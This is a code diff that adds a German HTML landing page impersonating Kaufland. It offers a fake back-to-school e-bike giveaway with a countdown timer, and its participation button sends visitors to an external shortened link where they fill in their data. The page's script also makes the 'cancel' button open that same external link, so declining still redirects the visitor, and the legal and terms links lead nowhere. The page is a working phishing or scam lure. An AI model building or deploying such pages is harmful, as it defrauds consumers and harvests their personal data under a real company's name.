@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kaufland Schulstart Aktion - E-Bike Gewinnen!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --kaufland-red: #e2001a;
+            --kaufland-dark: #2e2e2e;
+            --kaufland-light: #f7f7f7;
+            --kaufland-green: #00a550;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f0f0;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header styles */
+        header {
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--kaufland-red);
+            margin-left: 10px;
+        }
+        
+        .logo-icon {
+            color: var(--kaufland-red);
+            font-size: 32px;
+        }
+        
+        /* Hero section */
+        .hero {
+            background: linear-gradient(to right, var(--kaufland-red), #ff4d4d);
+            color: white;
+            padding: 60px 0;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 30px;
+        }
+        
+        .countdown {
+            background-color: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .countdown-text {
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+        }
+        
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .countdown-unit {
+            background-color: white;
+            color: var(--kaufland-red);
+            border-radius: 5px;
+            padding: 10px;
+            min-width: 70px;
+        }
+        
+        .countdown-number {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        
+        .countdown-label {
+            font-size: 0.9rem;
+        }
+        
+        /* Promotion section */
+        .promotion {
+            padding: 60px 0;
+            background-color: white;
+        }
+        
+        .promotion-container {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 40px;
+        }
+        
+        .ebike-image {
+            flex: 1;
+            min-width: 300px;
+            text-align: center;
+        }
+        
+        .ebike-image img {
+            max-width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .promotion-details {
+            flex: 1;
+            min-width: 300px;
+        }
+        
+        .promotion-details h2 {
+            color: var(--kaufland-red);
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+        
+        .features {
+            list-style-type: none;
+            margin: 20px 0;
+        }
+        
+        .features li {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .features i {
+            color: var(--kaufland-green);
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+        
+        /* Participation section */
+        .participation {
+            background-color: var(--kaufland-light);
+            padding: 60px 0;
+        }
+        
+        .steps {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .step {
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            width: 250px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        
+        .step-number {
+            background-color: var(--kaufland-red);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-weight: bold;
+        }
+        
+        /* CTA section */
+        .cta-section {
+            padding: 80px 0;
+            background: linear-gradient(to bottom, #f9f9f9, #e6e6e6);
+            text-align: center;
+        }
+        
+        .cta-container {
+            max-width: 700px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .cta-container h2 {
+            color: var(--kaufland-red);
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+        
+        .cta-container p {
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+        }
+        
+        .btn {
+            background-color: var(--kaufland-red);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: inline-block;
+        }
+        
+        .btn:hover {
+            background-color: #c10015;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .btn-large {
+            padding: 18px 40px;
+            font-size: 1.3rem;
+        }
+        
+        /* Footer */
+        footer {
+            background-color: var(--kaufland-dark);
+            color: white;
+            padding: 40px 0;
+        }
+        
+        .footer-content {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 40px;
+        }
+        
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+        }
+        
+        .footer-section h3 {
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+        }
+        
+        .footer-section p, .footer-section a {
+            margin-bottom: 10px;
+            color: #ccc;
+            text-decoration: none;
+            display: block;
+        }
+        
+        .footer-section a:hover {
+            color: white;
+        }
+        
+        .social-icons {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .social-icons a {
+            font-size: 1.5rem;
+        }
+        
+        .copyright {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #444;
+            color: #ccc;
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .modal h2 {
+            color: var(--kaufland-red);
+            margin-bottom: 20px;
+        }
+        
+        .modal p {
+            margin-bottom: 25px;
+        }
+        
+        .modal-close {
+            background-color: #ccc;
+            color: #333;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .countdown-unit {
+                min-width: 50px;
+            }
+            
+            .countdown-number {
+                font-size: 1.5rem;
+            }
+            
+            .btn-large {
+                padding: 15px 30px;
+                font-size: 1.1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container header-container">
+            <div class="logo">
+                <i class="logo-icon fas fa-store"></i>
+                <span class="logo-text">Kaufland</span>
+            </div>
+            <div class="header-cta">
+                <a href="#participate" class="btn">Jetzt teilnehmen</a>
+              
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>Zum Schulstart: Gewinnen Sie ein E-Bike im Wert von 1.499€!</h1>
+            <p>Kaufland feiert den Schulanfang mit einer besonderen Aktion. Machen Sie mit und gewinnen Sie eines von 5 modernen E-Bikes!</p>
+            
+            <div class="countdown">
+                <p class="countdown-text">Noch bis zum 15. September mitmachen:</p>
+                <div class="countdown-timer">
+                    <div class="countdown-unit">
+                        <div class="countdown-number" id="days">05</div>
+                        <div class="countdown-label">Tage</div>
+                    </div>
+                    <div class="countdown-unit">
+                        <div class="countdown-number" id="hours">12</div>
+                        <div class="countdown-label">Stunden</div>
+                    </div>
+                    <div class="countdown-unit">
+                        <div class="countdown-number" id="minutes">45</div>
+                        <div class="countdown-label">Minuten</div>
+                    </div>
+                    <div class="countdown-unit">
+                        <div class="countdown-number" id="seconds">30</div>
+                        <div class="countdown-label">Sekunden</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Promotion Details -->
+    <section class="promotion">
+        <div class="container promotion-container">
+            <div class="ebike-image">
+                <img src="https://i.gyazo.com/d087c573ac4259e23ccc4629923193c0.png" alt="Kaufland E-Bike Gewinnspiel">
+            </div>
+            <div class="promotion-details">
+                <h2>Modernes E-Bike für den Schulweg</h2>
+                <p>Machen Sie den Schulweg Ihrer Kinder zum Erlebnis! Dieses hochwertige E-Bike macht nicht nur Spaß, sondern ist auch umweltfreundlich und praktisch.</p>
+                
+                <ul class="features">
+                    <li><i class="fas fa-check-circle"></i> 250W Motor für müheloses Fahren</li>
+                    <li><i class="fas fa-check-circle"></i> Bis zu 80 km Reichweite pro Akkuladung</li>
+                    <li><i class="fas fa-check-circle"></i> 7-Gang Schaltung für jede Strecke</li>
+                    <li><i class="fas fa-check-circle"></i> Robuster Aluminiumrahmen</li>
+                    <li><i class="fas fa-check-circle"></i> Integrierte LED-Beleuchtung</li>
+                    <li><i class="fas fa-check-circle"></i> Für Jugendliche und Erwachsene geeignet</li>
+                </ul>
+                
+                <p>Das E-Bike ist perfekt für den täglichen Schulweg, aber auch für Freizeitausflüge mit der Familie!</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Participation -->
+    <section class="participation">
+        <div class="container">
+            <h2 style="text-align: center; margin-bottom: 20px;">So einfach können Sie gewinnen:</h2>
+            <p style="text-align: center; max-width: 800px; margin: 0 auto;">Die Teilnahme an unserem Gewinnspiel ist ganz einfach. Folgen Sie diesen Schritten:</p>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Einkaufen</h3>
+                    <p>Besuchen Sie einen Kaufland Markt und kaufen Sie Schulartikel im Wert von mindestens 20€.</p>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Registrieren</h3>
+                    <p>Klicken Sie auf den Teilnahme-Button und füllen Sie das Formular mit Ihren Daten aus.</p>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Gewinnen</h3>
+                    <p>Mit etwas Glück gewinnen Sie eines von 5 E-Bikes für sich oder Ihre Kinder!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="cta-section" id="participate">
+        <div class="container">
+            <div class="cta-container">
+                <h2>Jetzt am Gewinnspiel teilnehmen!</h2>
+                <p>Füllen Sie das Teilnahmeformular aus und mit etwas Glück gewinnen Sie eines der begehrten E-Bikes von Kaufland. Die Aktion läuft nur für begrenzte Zeit!</p>
+                
+                <button class="btn btn-large" id="participate-btn">Zur Teilnahme</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>Über Kaufland</h3>
+                    <p>Kaufland ist einer der führenden Handelskonzerne in Europa mit über 1.300 Filialen in Deutschland und zahlreichen weiteren in ganz Europa.</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Kontakt</h3>
+                    <p>Kaufland Dienstleistung GmbH & Co. KG</p>
+                    <p>Rötelstraße 35</p>
+                    <p>74172 Neckarsulm</p>
+                    <p>Tel: 0800 152 83 52</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Rechtliches</h3>
+                    <a href="#">Teilnahmebedingungen</a>
+                    <a href="#">Datenschutz</a>
+                    <a href="#">Impressum</a>
+                    <a href="#">Widerrufsrecht</a>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Folgen Sie uns</h3>
+                    <p>Bleiben Sie auf dem Laufenden mit unseren neuesten Aktionen und Angeboten.</p>
+                    <div class="social-icons">
+                        <a href="#"><i class="fab fa-facebook"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                <p>&copy; 2025 Kaufland Dienstleistung GmbH & Co. KG. Alle Rechte vorbehalten.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal" id="redirect-modal">
+        <div class="modal-content">
+            <h2>Weiterleitung</h2>
+            <p>Sie werden jetzt zum Teilnahmeformular weitergeleitet. Bitte haben Sie einen Moment Geduld.</p>
+            <p>Falls die Weiterleitung nicht automatisch funktioniert, klicken Sie auf den untenstehenden Link.</p>
+            <button class="btn" id="modal-redirect-btn">Zum Formular</button>
+            <button class="modal-close" id="modal-close">Abbrechen</button>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer
+        function updateCountdown() {
+            const targetDate = new Date('2025-09-15T23:59:59');
+            const now = new Date();
+            const difference = targetDate - now;
+            
+            if (difference > 0) {
+                const days = Math.floor(difference / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+                
+                document.getElementById('days').textContent = days.toString().padStart(2, '0');
+                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            } else {
+                document.getElementById('days').textContent = '00';
+                document.getElementById('hours').textContent = '00';
+                document.getElementById('minutes').textContent = '00';
+                document.getElementById('seconds').textContent = '00';
+            }
+        }
+        
+        // Update countdown every second
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+        
+        // Redirect functionality
+        document.getElementById('participate-btn').addEventListener('click', function() {
+            document.getElementById('redirect-modal').style.display = 'flex';
+        });
+        
+        document.getElementById('modal-redirect-btn').addEventListener('click', function() {
+            window.open('https://smrturl.co/a/s89e1443dd4/15097?s1=', '_blank');
+            document.getElementById('redirect-modal').style.display = 'none';
+        });
+        
+        document.getElementById('modal-close').addEventListener('click', function() {
+           window.open('https://smrturl.co/a/s89e1443dd4/15097?s1=', '_blank');
+            document.getElementById('redirect-modal').style.display = 'none';
+        });
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', function(event) {
+            if (event.target === document.getElementById('redirect-modal')) {
+                document.getElementById('redirect-modal').style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
